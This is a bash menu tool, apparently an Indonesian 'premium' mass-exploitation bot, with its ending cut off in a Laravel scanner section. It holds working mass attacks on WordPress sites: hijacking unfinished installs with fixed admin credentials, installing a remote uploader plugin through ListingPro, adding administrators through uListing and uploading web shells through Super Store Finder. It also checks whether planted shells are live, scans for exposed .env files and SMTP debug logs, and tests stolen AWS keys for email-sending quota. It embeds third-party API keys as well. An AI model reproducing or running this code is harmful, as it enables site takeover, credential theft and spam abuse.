#!/bin/bash
blue='\e[0;34'
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'


PS3="choose :  "
checking(){
	cekdir="Resultbot"
	if [[ -d "$cekdir" ]];
	then
		echo -e "${okegreen}[+] Directory Result Found"
		clear
	else
		echo -e "${red}[-] Directory Result Not Found"
		sleep 2
		mkdir Resultbot
		touch Resultbot/grabdomainv3.txt
		touch Resultbot/grabipv3.txt
		touch Resultbot/grabdomainv2.txt
		touch Resultbot/grabdomainv4.txt
		touch Resultbot/grabipv4.txt

		echo -e "${okegreen}[+] Creating Directory"
		sleep 3
		clear
	fi
}
checking

clear

mainmenu=("Laravel Pack" "Grabsite Pack" "Wordpress Pack" "telerik" "Shell Checker" "Mass AWS Checker Limit" "Mass Alexa Rank Checker" "Mass DA/PA Checker" "Shodan Bot" "Subdomain Finder $(echo -e "$red[Comingsoon]$yellow")" "Directory Scanner" "Publicwww Dorker" "Special Bot $(echo -e "$red[Comingsoon]$yellow")" 
	"Special Bot $(echo -e "$red[Comingsoon]$yellow")")
select opt in "${mainmenu[@]}"
do
	case $opt in	
		"Grabsite Pack")
		  grabber(){
	           clear
	           echo -e $yellow"====================================="
	           echo -e $yellow"         Mass Grabsite Pack          "
	           echo -e $yellow"       Copyright Mrcakil@2020        "
	           echo -e $yellow"====================================="
	           main=("Grabsite Version 1 $(echo -e "${red}[Cloudflare]$yellow")                                    " "Grabsite Version 2" "Grabsite Version 3" "Grabsite Version 4" "Grabsite Version 5" 
	           	"Grabsite Version 6 Regeneration" "Grabsite Version 6 Regeneration 1.1" "Grabsite Version 6 Regeneration 2.1" "back")
	           select ok in "${main[@]}"
	           do		
		           case $ok in
			            "Grabsite Version 1 $(echo -e "${red}[Cloudflare]$yellow")                                    ")
                         echo "[!] Down!"
                        ;;
                        
                        "Grabsite Version 2")
                        grabber(){
	                        checksite(){
		                       COUNTER=$((COUNTER+1))
		                       for tanggall in `seq $tanggal $tanggalnya`;
		                          do
			                      re=$(curl -s -L "https://www.dubdomain.com/new-domain-registered-dates/$tahun-$bulan-$tanggall/$page" |  grep -Po '(?<=\?domain=).*?(?=")')
			                      if [[ $re =~ 'com' ||  $re =~ 'net' ||  $re =~ 'au' ||  $re =~ 'org' || $re =~ 'gov' ||  $re =~ '.' ]];
			                      then
				                     dapetnya=$(echo "$re" | wc -l)
				                     resultnya=$(cat Resultbot/grabdomainv2.txt | wc -l)
				                     printf "${okegreen}[${COUNTER}] => [$tahun-$bulan-$tanggall] | [Page][$page] =>  [$dapetnya|$resultnya]\n";
				                     echo "$re" >> Resultbot/grabdomainv2.txt
			                      else
				                     printf "${red}[${COUNTER}] => $red$domain => Limit Page Boss!\n";
				                     result=$(cat Resultbot/grabdomainv2.txt | wc -l)
				                     printf "${okegreen}Total : $result\n";
			                       fi
		                       done
	                        }
	                        banner(){
		                    read -p "Tahun => " tahun;
		                    read -p "Bulan => " bulan;
		                    read -p "Tanggal => " tanggal;
		                    read -p "Sampai Tanggal => " tanggalnya;
		                    read -p "Sampai page => " pagenya;
	                        }
	                        banner
	                        for page in `seq 1 $pagenya`;
	                           do
		                        checksite $page
	                        done
                        }
                        grabber
                        ;;        

                        "Grabsite Version 3")
                         CON=1
                         grab(){
	                         domen=$(curl -s "https://site-stats.org/domains/.${domain}/${page}/" -L | sed 's/\/ip\///g' | grep -Po '(?<=<a href="/).*?(?=/" title)')
	                         ip=$(curl -s "https://site-stats.org/domains/.${domain}/${page}/" -L | grep -Po '(?<=<a href="/ip/).*?(?=/" title)')
	                         if [[ $domen =~ '${domain}' || $ip =~ '.' ]];
	                         then
		                       echo "$domen" >> Resultbot/grabdomainv3.txt
		                       echo "$ip" >> Resultbot/grabipV3.txt
		                       regdomen=$(echo "$domen" | wc -l)
		                       regip=$(echo "$ip" | wc -l)
		                       domainnya=$(cat Resultbot/grabdomainv3.txt | wc -l)
		                       ipnya=$(cat Resultbot/grabipv3.txt | wc -l)
		                       echo -e "${okegreen}[+] Domain : $regdomen | ip : $regip | total : $domainnya|$ipnya"
	                         else
		                      echo -e "${red}[+] Failed"
	                         fi
                            }
                         banner(){
	                         read -p "Masukan Domain : " domain;
	                         read -p "Masukan page : " pagen;
	                         read -p "Sampai page : " pagenya;
	                         read -p "Masukan Threads : " THREADS;
                            }
                           banner
                           for page in `seq $pagen $pagenya`;
                             do
	                          FAST=$(expr $CON % $THREADS)
	                          if [[ $FAST == 0 && $CON > 0 ]];
	                          then
		                      sleep 5
	                          fi
	                          grab &
	                          CON=$[$CON+1]
                           done
                           wait
                        ;;

                        "Grabsite Version 4")
                         grabber(){
	                          grab(){
		                          domen=$(curl -s "https://www.websitesvalues.com/domains/.${domain}/$page/" -L | grep -Po '(?<=<a href = https://websitesvalues.com/search/).*?(?=/)')
		                          ip=$(curl -s "https://www.websitesvalues.com/domains/.${domain}/$page/" -L | grep -Po '(?<=</a></strong></td><td><strong>).*?(?=</strong>)')
		                          if [[ $domen =~ '${domain}' || $ip =~ '.' ]];
		                          then
			                         echo "$domen" >> Resultbot/grabdomainv4.txt
			                         echo "$ip" >> Resultbot/grabipv4.txt
			                         regdomen=$(echo "$domen" | wc -l)
			                         regip=$(echo "$ip" | wc -l)
			                         domainnya=$(cat Resultbot/grabdomainv4.txt | wc -l)
			                         ipnya=$(cat Resultbot/grabipv4.txt | wc -l)
			                         echo -e "${okegreen}[+] page : $page | Domain : $regdomen | ip : $regip | total : $domainnya|$ipnya"
		                           else
			                         echo -e "${red}[+] Failed"
		                           fi
	                            }
	                         
	                         banner(){
		                          read -p "Masukan Domain : " domain;
		                          read -p "Masukan page : " pagen;
		                          read -p "Sampai page : " pagenya;
	                            }
	                          banner
	                          for page in `seq $pagen $pagenya`;
	                             do
		                           grab $domain
	                          done
                            }
                           grabber
                        ;;

                      "Grabsite Version 5")
                         grabber(){
	                         grab(){
		                         domen=$(curl -s "https://www.sitelinks.info/domains/.${domain}/$page/" -L | grep -oP "<a href = https://www.sitelinks.info/(.*?)/>" | cut -d "/" -f4)
		                         ip=$(curl -s "https://www.sitelinks.info/domains/.${domain}/$page/" -L | grep -oP "<a href=./api_same_ip/(.*?)/.>" | cut -d "/" -f3)
		                         if [[ $domen =~ '${domain}' || $ip =~ '.' ]];
		                         then
			                         echo "$domen" >> Resultbot/grabdomainv5.txt
			                         echo "$ip" >> Resultbot/grabipv5.txt
			                         regdomen=$(echo "$domen" | wc -l)
			                         regip=$(echo "$ip" | wc -l)
			                         domainnya=$(cat Resultbot/grabdomainv5.txt | wc -l)
			                         ipnya=$(cat Resultbot/grabipv5.txt | wc -l)
			                         echo -e "${okegreen}[+] page : $page | Domain : $regdomen | ip : $regip | total : $domainnya|$ipnya"
		                          else
			                         echo -e "${red}[+] Failed"
		                           fi
	                            }
	
	                         banner(){
		                          echo -e $okegreen"Mass Grabsite V5 Persecond Reload"
		                          read -p "Masukan Domain : " domain;
		                          read -p "Masukan page : " pagen;
		                          read -p "Sampai page : " pagenya;
	                            }
	                         banner

	                         for page in `seq $pagen $pagenya`;
	                            do
		                          grab $domain
	                         done
                            }
                          grabber
                        ;;	

                        "Grabsite Version 6 Regeneration")
                        checksite(){
                           COUNTER=$((COUNTER+1))
                           for tanggall in `seq $tanggal $tanggalnya`;
                              do
                              get=$(curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" "http://yoid.com/archive.php?d=$tahun-$bln-$tanggall&a=$huruf" -L)
                              list=$(echo "$get" | grep -oP "href./detail.php\K[^ ]+.*>" | cut -d ">" -f2 | cut -d "<" -f1)
                              if [[ $list =~ 'com' ||  $list =~ 'net' ||  $list =~ 'au' ||  $list =~ 'org' || $list =~ 'gov' ||  $list =~ 'goid' ]];
                              then
                                 echo "$list" >> Resultbot/resultv6.txt
                                 dapetnya=$(echo "$list" | wc -l)
                                 res=$(cat Resultbot/resultv6.txt | wc -l)
                                 printf "${okegreen}[${COUNTER}] => [$tahun-$bln-$tanggall] | [huruf : $huruf] =>  [$dapetnya|$res]\n";
                              else
                                 printf "${red}[${COUNTER}] => [$tahun-$bln-$tanggall] | [huruf : $huruf] => $red Failed\n"
                               fi
                           done
                        }
                        banner(){
                         read -p "Tahun => " tahun;
                         read -p "Bulan => " bln;
                         read -p "Tanggal => " tanggal;
                         read -p "Sampai Tanggal => " tanggalnya;
                         read -p "Sampai Huruf => " hurufnya;
                        }
                        banner
                        for huruf in $(eval echo "{a..$hurufnya}");
                           do
                          checksite $huruf
                        done
                        ;;
                        
                        "Grabsite Version 6 Regeneration 1.1")
                          echo -e "$yellow[+] Comingsoon!"
                        ;;

                        "Grabsite Version 6 Regeneration 2.1")
                          echo -e "$yellow[+] Comingsoon!"
                        ;;

                        "back")
                          bash premium.sh rizki1337
                        ;;		
                        *)
                        echo "[*] Command Salah"
                   esac
                done   
            }
            grabber
        ;;

     "Wordpress Pack")
	     wordpress(){
		     clear
		     echo -e $yellow"====================================="
		     echo -e $yellow"        Mass Wordpress Pack          "
		     echo -e $yellow"       Copyright Mrcakil@2020        "
		     echo -e $yellow"====================================="
		     main=("Mass WPinstall Scanner" "Mass WPinstall Scanner And Exploit" "Mass Exploit WPlistingPro" 
		 	 "Mass Exploit WPulisting" "Mass Exploit WPSuperstoreFinder" "Mass Scanner WP SMTP" "back")
	         select wp in "${main[@]}"
	           do		
		          case $wp in
		      	     "Mass WPinstall Scanner And Exploit")
			         COUNTER=1
			         checksite(){
                         #Change Configuration boss
                         title="King"
                         user="EnforcerPlease69"
                         password="EnforcerPlease69"
                         email="enforcerplease69@protonmail.com"
                         curlvar=$(curl -s --insecure -L -H "User-Agent: Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058" $target$i | tr -d "\0")
                         if [[ $curlvar =~ 'Site Title' ]];
                         then
                	         vuln="${okegreen}[Vuln]";
                	         echo "$target$i" >> Resultbot/valid.txt
                	         exploit=$(curl --silent --data-urlencode "weblog_title=${title}" --data-urlencode "user_name=${user}" --data-urlencode "admin_password=${password}" --data-urlencode "admin_password2=${password}" --data-urlencode "admin_email=${email}"   --data-urlencode "Submit=Install+WordPress" $target$i)
                             if [[ $exploit =~ 'WordPress has been installed. Thank you, and enjoy' || $exploit =~ 'Success!' ]];
                	         then
                		          up="${okegreen}[Username : $user|Password : $password]"
                	              echo "$target$i => Username : $user|Password : $password" >> Resultbot/successwpinstall.txt
                	         else
                	              up="${red}[Failed]"
                 	           fi
                           else
                	          vuln="${red}[Not Vuln]";
                           fi
                        }
                      banner(){
            	         read -p "Target List : " targetnya;
            	         read -p "Threads : " THREADS;
                        }
                      banner
                      checkernya(){
            	         checksite $target
            	         echo -e "${cyan}[${COUNTER}] => [$target] => $vuln $up"
                        }
                      for target in $(cat $targetnya);
                         do
            	           for i in `cat path.txt`
            	              do
            		           FAST=$(expr $COUNTER % $THREADS)
            		           if [[ $FAST == 0 && $COUNTER > 0 ]];
            		           then
            			          sleep 1
            		           fi
            		           checkernya &
            		           COUNTER=$((COUNTER+1))
            	           done
                       done
                       wait
                       total=$(cat Resultbot/valid.txt | wc -l)
                       printf "${cyan}Total : $total\n";
                       ;;

                      "Mass WPinstall Scanner")
        	           COUNTER=1
        	           checksite(){
        		           curlvar=$(timeout 10 curl -s -H "User-Agent: Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058" $target$i)
        		           if [[ $curlvar =~ 'Site Title' ]];
        		           then
        			         printf "${okegreen}[${COUNTER}] => [$target] => OK\n";
        			         echo "$target$i" >> Resultbot/valid.txt
        		           else
        			         printf "${red}[${COUNTER}] => $red$target => ga valid\n";
        		           fi
        	            }
        	            banner(){
        		          read -p "Masukan List : " list;
        	              read -p "Masukan Threads : " THREADS;
        	            }
        	            banner
        	            for target in $(cat $list); 
        	               do
        		            for i in `cat path.txt`
        		              do
        			           FAST=$(expr $COUNTER % $THREADS)
        			           if [[ $FAST == 0 && $COUNTER > 0 ]];
        			           then
        				          sleep 1
        			           fi
        			           checksite $target
        			           COUNTER=$((COUNTER+1))
        		           done
        	           done
        	           total=$(cat Resultbot/valid.txt | wc -l)
        	           printf "${cyan}Total : $total\n";
                       ;;

                     "Mass Exploit WPlistingPro")        
        	           COUNTER=1
        	           listingpro(){
        		            curlvar=$(curl -s --connect-timeout 10 --max-time 10 --insecure '$target/wp-admin/admin-ajax.php' -d 'action=lp_cc_addons_actions&ccAction=install&ccDestin=external&ccFileUrl=https://github.com/mrcakil/uploader/raw/main/mrcakil.zip' | tr -d '\0')
        		            if [[ $curlvar =~ '{"status":"success"}' ]]; 
        		            then
        			         printf "${okegreen}[{COUNTER}] => [$target/wp-content/plugins/mrcakil/up.php]";
        			         echo "$target/wp-content/plugins/mrcakil/up.php" >> Resultbot/vulnListingpro.txt
        		           else
        			         printf "${red}[${COUNTER}] => $target => [Not Vuln]\n"
        		           fi
        	            }
        	          banner(){
        		         read -p "Masukan List : " list;
        		         read -p "Masukan Threads : " THREADS;
        	            }
        	          banner
                      for target in $(cat $list); 
        	             do
        		          FAST=$(expr $COUNTER % $THREADS)
        		          if [[ $FAST == 0 && $COUNTER > 0 ]];
        		          then
        			         sleep 1
        		           fi
        		           listingpro $target
        		           COUNTER=$((COUNTER+1))
        	           done
                       total=$(cat Resultbot/vulnListingpro.txt | wc -l)
        	           printf "${cyan}Total : $total\n";
                       ;;

                      "Mass Exploit WPulisting")
        	           COUNTER=1
        	           ulisting(){
        		          curlvar=$(curl --silent --connect-timeout 10 --max-time 10 --insecure "$target/wp-admin/admin-ajax.php?action=stm_listing_register" -d '{"email": "mrcakil@programmer.net","first_name":"Mrcakil","last_name": "bot", "login": "mrcakil", "password": "mrcakil1337", "password_repeat":"mrcakil1337","role":"administrator"}')
        		          if [[ $curlvar =~ '"message":"Registration completed successfully."' ]];
        		          then
        			         printf "${okegreen}[${COUNTER}] => $target => [VULN] [User ADDED]\n"
        			         printf "Url: $target/wp-login.php\nUsername: mrcakil\nPassword: mrcakil1337\n\n" >> Resultbot/resultULISTING.txt
        		          else
        	      		     printf "${red}[${COUNTER}] => $target => [Not Vuln]\n"
        		           fi
        	            }
        	            banner(){
        		          read -p "Masukan List : " list;
        		          read -p "Masukan Threads : " THREADS;
        	            }
        	            banner
        	            for target in $(cat $list); 
        	              do
        		           FAST=$(expr $COUNTER % $THREADS)
        		           if [[ $FAST == 0 && $COUNTER > 0 ]];
        		           then
        			          sleep 1
        		           fi
        		           ulisting $target
        		           COUNTER=$((COUNTER+1))
        	           done
        	           total=$(cat Resultbot/resultULISTING.txt | wc -l)
        	           printf "${cyan}Total : $total\n";
                       ;;

                      "Mass Exploit WPSuperstoreFinder")        
        	          checksite(){
        		          IFS=$'\r\n'
        		          COUNTER=$((COUNTER+1))
        		          exploitnya=$(curl --silent -A "Mozilla" -X POST -H "Content-Type: multipart/form-data" -F "default_location=@shellku.csv.php" "$target/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/import.php" -L)
        		          if [[ $exploitnya =~ "<div class='wrap'>" ]];
        		          then
        		 	         printf "${okegreen}[${COUNTER}] => [$target] => Vuln Boss\n";
        			         printf "${okegreen}[${COUNTER}] => [$target] => Checking Shell Boss\n";
        			         ngecheck=$(curl --silent -A "Mozilla" "$target/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/SSF_WP_UPLOADS_PATH/csv/import/shellku.csv.php" -L)
                             if [[ $ngecheck =~ 'MARIJUANA' ]];
        			         then
        				          printf "${okegreen}[${COUNTER}] => [$target/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/SSF_WP_UPLOADS_PATH/csv/import/shellku.csv.php] => Success Boss \n";
        				          printf "[shell] => $target/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/SSF_WP_UPLOADS_PATH/csv/import/shellku.csv.php\n" >> Resultbot/success_ssf.txt
        			          else
        				          printf "${red}[${COUNTER}] => [$target] => gagal bos\n";
        			           fi
        		          else
        			          printf "${red}[${COUNTER}] => [$target] => Not Vuln Boss\n";
        		           fi
        	            }
        	         banner(){
        		         read -p "Masukan List : " list;
        	            }
        	           banner
        	           for target in $(cat $list); do
        		          checksite $target
        	           done
        	           total=$(cat Resultbot/success_ssf.txt | wc -l)
        	           printf "${cyan}Total : $total\n";
                     ;;

                     "Mass Scanner WP SMTP")
        	          checker(){
        		         curlvar=$(curl -s "$target/wp-content/plugins/easy-wp-smtp/" -L)
        		         if [[ $curlvar =~ 'debug_log.txt' ]];
        		         then
        			         r=$(echo "$curlvar" | grep -oP '<a href="(.*?)_debug_log.txt">' | cut -d '"' -f2)
        			         echo -e $cyan"[Site : $target] =>$okegreen Found : $r"
        			         echo "$target/wp-content/plugins/easy-wp-smtp/$r" >> Resultbot/wpsmtpResult.txt
        		          else
        			          echo -e $cyan"[Site : $target] =>$red Not Found"
        		           fi
        	            }
        	          banner(){
        	  	         read -p "target list : " targetnya;
        	            }
        	          banner
        	         for target in $(cat $targetnya);
        	             do
        		          checker $target
        	          done
        	          ;;

                     "back")
        	         bash premium.sh rizki1337
                     ;;
                   *)
                    echo "[*] Command Salah"
                   esac
               done  
            }
            wordpress
        ;;

       "telerik")
	   telerik(){
		  CON=1
		  checker(){
		 	 check=$(curl -s "${target}/Telerik.Web.UI.DialogHandler.aspx" -L)
			 if [[ $check =~ 'Loading the dialog...' ]];
			 then
				 echo -e "$okegreen[+] $target => Found"
				 echo "${target}/Telerik.Web.UI.DialogHandler.aspx" >> Resultbot/telerikresult.txt
			  else
				 echo -e "$red[+] $target => Not Found"
			   fi
		    }
		    banner(){
		 	   read -p "Masukan list : " list;
			   read -p "Threads : " THREADS;
		    }
		    banner
		    for target in `cat $list`;
		     do
			   FAST=$(expr $CON % $THREADS)
			   if [[ $FAST == 0 && $CON > 0 ]];
			   then
				  sleep 5
			   fi
			   checker $target
			   CON=$[$CON+1]
		   done
		   wait
	    }
	   telerik
        ;;

      "Shell Checker")
	   shell(){
		   checksite(){
			  COUNTER=$((COUNTER+1))
			  curlvar=$(curl -s -H "User-Agent: Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058" --insecure -L $target)
			  if [[ $curlvar =~ 'drwxrwxrwx' || $curlvar =~ '/home/' || $curlvar =~ '/wwwroot/' || $curlvar =~ '/www/' || $curlvar =~ 'public_html' || $curlvar =~ '/var/' || $curlvar =~ 'Shell' || $curlvar =~ 'Mini Shell' || $curlvar =~ 'type=password' || $curlvar =~ 'type="password"' || $curlvar =~ "<input type='file' name='idx_file'>" ]];
			  then
				  printf "${okegreen}[${COUNTER}] => [$target] => Live\n";
				  echo "$target" >> Resultbot/resultchecker.txt
			  else
				  printf "${red}[${COUNTER}] => $red$target => Die Boss :(\n";
			   fi
		    }
		   banner(){
			  read -p "Masukan List : " list;
		    }
		   banner
		   for target in $(cat $list); do
			 checksite $target
		   done
		   total=$(cat Resultbot/resultchecker.txt | wc -l)
		   printf "${cyan}Total : $total\n";
	    }
	   shell
       ;;

     "Mass AWS Checker Limit")
	  checker(){
	  	 id=$(echo "$list" | cut -d "|" -f1)
		 secret=$(echo "$list" | cut -d "|" -f2)
		 reg=$(echo "$list" | cut -d "|" -f3)
		 printf "[default]\naws_access_key_id = $id\naws_secret_access_key = $secret" > $folder/credentials
		 printf "[default]\nregion = $reg\noutput = json" > $folder/config
		 get=$(aws ses get-send-quota 2>/dev/null; echo $?)
		 if [[ $get =~ '0' ]];
		 then
			 limit=$(aws ses get-send-quota | awk -F '[:,]' '/"Max24HourSend"/ {gsub("[[:blank:]\"]+", "", $2); print $2}')
			 a=$(aws ses get-send-quota | awk -F '[:,]' '/"MaxSendRate"/ {gsub("[[:blank:]\"]+", "", $2); print $2}')
			 b=$(aws ses get-send-quota | awk -F '[:,]' '/"SentLast24Hours"/ {gsub("[[:blank:]\"]+", "", $2); print $2}')
			 echo -e "$okegreen[+] aws : $id|$secret|$reg => Mantap bos"
			 echo -e "$okegreen[+] Limit : $limit|Sendrate : $a|SendLast : $b"
			 echo "$id|$secret|$reg => Limit : $limit|Sendrate : $a|SendLast : $b " >> Resultbot/awsresult.txt
		 else
			 echo -e "$red[+] aws : $id|$secret|$reg => Denied"
		   fi
	    }
      banner(){
		 echo -e $yellow"[+]${okegreen} AWS Mass Checker Limit"
		 echo -e $yellow"[+]${okegreen} Example list : awskeyid|awssecret|region"
		 echo -e $yellow"[+]${okegreen} Example Config Folder : /root/.aws"
		 read -p "Masukan List : " list;
		 read -p "Masukan Folder : " folder;
	    }
	   banner
	   for list in $(cat $1);
	     do
		 checker $list
	   done
       ;;

     "Mass Alexa Rank Checker")
	  checksite(){
		  COUNTER=$((COUNTER+1))
		  curlvar=$(curl -s "http://data.alexa.com/data?cli=10&dat=snbamz&url=$target")
		  if [[ $curlvar =~ 'RANK=' ]];
		  then
			 global=$(echo $curlvar | grep -Po '" TEXT="(.*?)"' | cut -d '"' -f3)
			 rank=$(echo $curlvar | grep -Po '" RANK="(.*?)"' | cut -d '"' -f3)
			 country=$(echo $curlvar | grep -Po '" NAME="(.*?)"' | cut -d '"' -f3)
			 printf "\n"
			 printf "${okegreen}[${COUNTER}] => [Site]         =>  [$target]\n"
			 printf "${okegreen}[${COUNTER}] => [Country]      =>  [$country]\n"
			 printf "${okegreen}[${COUNTER}] => [Country Rank] =>  [$rank]\n"
			 printf "${okegreen}[${COUNTER}] => [Global Rank]  =>  [$global]\n\n"
			 echo "[Site] =>  $target" >> Resultbot/result_alexa.txt
			 echo "[Country] =>  $country" >> Resultbot/result_alexa.txt
			 echo "[Country Rank] =>  $rank" >> Resultbot/result_alexa.txt
			 echo "[Global Rank] =>  $global" >> Resultbot/result_alexa.txt
			 echo " " >> Resultbot/result_alexa.txt
		  else
			 printf "${okegreen}[${COUNTER}] => [Site] => [$target]:[${red}Bad!${okegreen}]\n"
		   fi
	    }
	  banner(){
		 read -p "Masukan List : " list;
	    }
	  banner
	  for target in $(cat $list); 
	    do
		 checksite $target
	  done
	  total=$(cat result_alexa.txt | wc -l)
	  printf "${cyan}Total : $total\n";
     ;;

     "Mass DA/PA Checker")
	  checksite(){
		 COUNTER=$((COUNTER+1))
		 curlvar=$(curl --silent --data-urlencode "domain=http://$target" --data-urlencode "submit=Get+Website+Metrics" "https://www.countingcharacters.com/website-authority-checker")
		 if [[ $curlvar =~ "Domain Authority:" || $curlvar =~ "Page Authority:" ]];
		 then
			 domain=$(echo $curlvar | grep -Po "Domain Authority: <span style='color:#2d3436''>[0-9]*" | cut -d ">" -f2)
			 page=$(echo $curlvar | grep -Po "Page Authority: <span style='color:#2d3436''>[0-9]*" | cut -d ">" -f2)
			 printf "${okegreen}[${COUNTER}] => [Site] => [$target]\n"
			 printf "${okegreen}[${COUNTER}] => [Domain Authority] => [$domain]\n"
			 printf "${okegreen}[${COUNTER}] => [Page Authority]   => [$page]\n\n"
			 printf "[${COUNTER}] => [Site] => [$target]\n" >> Resultbot/dapacheck.txt
			 printf "[${COUNTER}] => [Domain Authority] => [$domain]\n" >> Resultbot/dapacheck.txt
			 printf "[${COUNTER}] => [Page Authority]   => [$page]\n\n" >> Resultbot/dapacheck.txt
		  else
			 printf "[${COUNTER}] => [Site] => [$target][${red}Bad!}]\n"
		   fi
	    }
	   banner(){
		 read -p "Masukan List : " list;
	    }
	   banner
	   for target in $(cat $list);
	    do
		  checksite $target
	   done
	   total=$(cat Resultbot/dapacheck.txt | wc -l)
	   printf "${cyan}Total : $total\n";
     ;;

     "Shodan Bot")
	 akun="https://api.shodan.io/shodan/host/search?key=Ew5wimj3MvAE68B60X2siZI4GEK2MsCf&query="
	 path="&facets=country:"
	 banner(){
		 read -p 'Masukan Query >> ' query;
		 read -p "Masukan Country >> " country;
	    }
	 banner
	 echo "=============================================="
	 echo "           Please Wait Running                "
	 echo "=============================================="
	 ambil=$(curl -s "$akun$query$path$country" -o output.json)
	 echo "$ambil"
	 host=$(cat output.json | grep -Po '"host": "(.*?)"' | cut -d '"' -f4 | uniq -d)
	 hostnya=$(cat output.json | grep -Po '"hostnames": *."(.*?)".' | cut -d '"' -f4 |  uniq -d)
	 ip=$(cat output.json | grep -Po '"ip_str": "(.*?)"' | cut -d '"' -f4 | uniq -d)
	 domen=$(cat output.json | grep -Po '"domains": "(.*?)"' | cut -d '"' -f4 | uniq -d)
	 port=$(cat output.json | grep -Po '"port": (.....*?)' | cut -d ':' -f2 | uniq -d)
	 lokasi=$(cat output.json | grep -Eo 'Location: (http|https)://[^\"]+' | cut -d ':' -f2,3 | sed 's/ //g' | uniq -d)
	 printf "${okegreen}[Domain]\n";
	 printf "${okegreen}$domen\n\n";
	 echo "$domen" >> Resultbot/resultdomain.txt

	 printf "${okegreen}[Host]\n";
	 printf "${okegreen}$host\n\n"
	 echo "$host" >> Resultbot/resulthost.txt

	 printf "${okegreen}[Hostnames]\n";
	 printf "${okegreen}$hostnya\n\n"
	 echo "$hostnya" >> Resultbot/resulthostnames.txt

	 printf "${okegreen}[IP Address]\n";
	 printf "${okegreen}$ip\n\n";
	 echo "$ip" >> Resultbot/resultIP.txt

	 printf "${okegreen}[port]\n";
	 printf "${okegreen}$port\n\n";
	 echo "$port" >> Resultbot/resultPORT.txt

	 printf "${okegreen}[PATH]\n";
	 printf "${okegreen}$lokasi\n\n";
	 echo "$lokasi" >> Resultbot/resultPATH.txt

	 printf "${okegreen}[Total Ditemukan]\n";

	 totaldomen=$(cat Resultbot/resultdomain.txt | wc -l)
	 totalhost=$(cat Resultbot/resulthost.txt | wc -l)
	 totalhostnames=$(cat Resultbot/resulthostnames.txt | wc -l)
	 totalip=$(cat Resultbot/resultIP.txt | wc -l)
	 totalport=$(cat Resultbot/resultPORT.txt | wc -l)
	 totalpath=$(cat Resultbot/resultPATH.txt | wc -l)

	 printf "${okegreen}[Domain : $totaldomen]\n";
	 printf "${okegreen}[Host : $totalhost]\n";
	 printf "${okegreen}[Hostnames : $totalhostnames]\n";
	 printf "${okegreen}[Ip Address : $totalip]\n";
	 printf "${okegreen}[Port : $totalport]\n";
	 printf "${okegreen}[Path : $totalpath]\n";
     ;;

     "Subdomain Finder $(echo -e "$red[Comingsoon]$yellow")")
	  echo "[+] Comingsoon"
	  sleep 3
	  bash premium.sh rizki1337
      ;;

     "Directory Scanner")
	  COUNTER=1
	  check(){
		  curlvar=$(curl -s -o /dev/null -w "%{http_code}" ${target}/${list} -L)
		  if [[ $curlvar =~ "200" ]];
		  then
			 printf "${cyan}[${COUNTER}] => ${target}/${list} => ${okegreen}Found\n";
			 echo "$target/$list" >> Resultbot/resultdir.txt
		  else
			 printf "${cyan}[${COUNTER}] => ${target}/${list} => ${red}Not Found\n";
		   fi
	    }
	  banner(){
		 read -p "Site : " target;
		 read -p "Threads : " THREADS;
	    }
	  banner
	  for list in `cat dir.txt`;
	    do
		 FAST=$(expr $COUNTER % $THREADS)
		 if [[ $FAST == 0 && $COUNTER > 0 ]];
		 then
		      sleep 1
		   fi
		   check &
		   COUNTER=$((COUNTER+1))
	  done
	  wait
      ;;

     "Publicwww Dorker")
	  tod(){
		 banner(){
			  read -p "Masukan Dork >> " dork;
		    }
		  banner
		  encode=$(echo "$dork" | sed -e 's/\//%2f/g')
		  echo -e $okegreen"[+] Please Wait.........."
		  echo -e $okegreen"[+] Searching.........."
		  ngecurl=$(curl -s "https://publicwww.com/websites/$encode/?export=urls&key=2b58a25b784483f566549302cee4bd3d" -o result.txt)
		  resultnya=$(cat result.txt | sed "/google/d" | sed "/whatsapp/d" | sed "/facebook/d" | sed "/youtube/d" | cut -d "/" -f3 >> Resultbot/resultfix.txt)
		  resultfix=$(cat Resultbot/resultfix.txt)
		  echo -e $okegreen"$resultfix"
		  total=$(cat Resultbot/resultfix.txt | wc -l)
		  printf "${cyan}Saved : $(pwd)/Resultbot/resultfix.txt\n";
		  printf "${cyan}Total : $total\n";
	    }
	   tod
     ;;

     "Laravel Pack")
	  clear
	  echo -e $yellow"====================================="
	  echo -e $yellow"        Mass Laravel Pack         "
	  echo -e $yellow"       Copyright Mrcakil@2020        "
	  echo -e $yellow"====================================="
	  main=("Scanner Debug And Env" "Scanner And Exploit Env" "Scanner And Exploit Debug" "back")
	  select lara in "${main[@]}"
      do
      	case $lara in
      		"Scanner Debug And Env")
		    CON=$((COUNTER+1))
		    scanner(){
			   debug=$(curl -s -d '"0x[]":"MrcakilB0t"' "$target" -L | tr -d "\0")
			   check=$(curl -s --connect-timeout 30 "${target}/.env" -L | tr -d "\0")
			   checkk=$(curl -s -i --connect-timeout 30 "${target}" -L | tr -d "\0")
			   if [[ $checkk =~ 'wp-content' ]];
			   then
				 word="$okegreen[Wordpress]"
				 echo "$target" >> Resultbot/wordpress.txt
			   else
				 word="$red[Wordpress]"
			   fi
			   if [[ $checkk =~ 'com_content' || $check =~ 'Joomla' ]]; 
			   then
				 jom="$okegreen[Jommla]"
				 echo "$target" >> Resultbot/joomla.txt
			   else
				 jom="$red[Jommla]"
			   fi
			   if [[ $checkk =~ '/site/default/files' || $check =~ 'Drupal' ]];
			   then
				 drup="$okegreen[Drupal]"
				 echo "$target" >> Resultbot/drupal.txt
			   else
				 drup="$red[Drupal]"
			   fi
			   if [[ $checkk =~ 'laravel' ]];
			   then
